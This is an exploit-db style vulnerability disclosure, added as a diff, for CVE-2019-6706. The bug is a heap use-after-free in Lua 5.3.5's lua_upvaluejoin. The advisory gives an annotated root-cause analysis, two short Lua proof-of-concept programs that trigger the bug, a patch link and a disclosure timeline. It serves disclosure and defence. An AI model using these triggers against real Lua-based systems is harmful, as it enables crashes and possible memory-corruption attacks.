@@ -1,0 +1,70 @@
+# Exploit Title: Lua 5.3.5
+# Exploit Author: Fady Mohamed Osman (https://twitter.com/fady_othman)
+# Exploit-db : http://www.exploit-db.com/author/?a=2986
+# Blog : https://blog.fadyothman.com/
+# Date: Jan. 10th 2019
+# Vendor Homepage: https://www.lua.org/
+# Software Link: https://www.lua.org/ftp/lua-5.3.5.tar.gz
+# Version: 5.3.5
+# CVE ID: CVE-2019-6706
+
+During a fuzz session using "AFL", I found a heap use after free in lua
+5.3.5, after analysis of the crash I found the root cause of the
+vulnerability, here's the details.
+
+The function `lua_upvaluejoin` in file lapi.c at line 1287 suffers from a
+use after free bug when supplied the same function for parameter f1 and f2
+and the same upvalue index, additionally I found that the bug is only
+triggered when the upvalue is closed, this happens because the
+`luaC_upvdeccount` function found in file lgc.c at line 678 will decrement
+the refcount and then free the upvalue if the refcount is zero and if the
+upvalue is closed.
+See the comments below for more explanation.
+--------------
+LUA_API void lua_upvaluejoin (lua_State *L, int fidx1, int n1,
+                                            int fidx2, int n2) {
+  LClosure *f1;
+  UpVal **up1 = getupvalref(L, fidx1, n1, &f1);
+  UpVal **up2 = getupvalref(L, fidx2, n2, NULL);
+  luaC_upvdeccount(L, *up1);      //Will delete up1
+  *up1 = *up2;     //up1 is up2 because it's the same upvalue and now it's
+freed.
+  (*up1)->refcount++;   //up1 is freed, yet it's used here.
+  if (upisopen(*up1)) (*up1)->u.open.touched = 1;
+  luaC_upvalbarrier(L, *up1);
+}
+--------------
+
+- To trigger the bug simply use a lua program like this (this one will
+crash):
+--
+f=load(function() end)
+interesting={}
+interesting[0]=string.rep("A",512)
+debug.upvaluejoin(f,1,f,1)
+---
+
+- Another program that will not crash (unless you compile with
+-fsanitize=address):
+---
+function w()
+local x = {}
+f = function() print(x) end
+end
+w()
+debug.upvaluejoin(f,2,f,2)
+---
+
+If you want a fix you can use the patch provided here:
+http://lua.2524044.n2.nabble.com/CVE-2019-6706-use-after-free-in-lua-upvaluejoin-function-tc7685575.html
+
+
+Timeline:
+- Jan 10th 2019 : Vulnerability discovered and reported to lua mailing list.
+- Jan 23rd 2019 : CVE Identifier obtained.
+- Jan 25th 2019 : Fix is suggested by Matěj Cepl.
+
+Refrences:
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6706
+https://security-tracker.debian.org/tracker/CVE-2019-6706
+https://vuldb.com/?id.130228
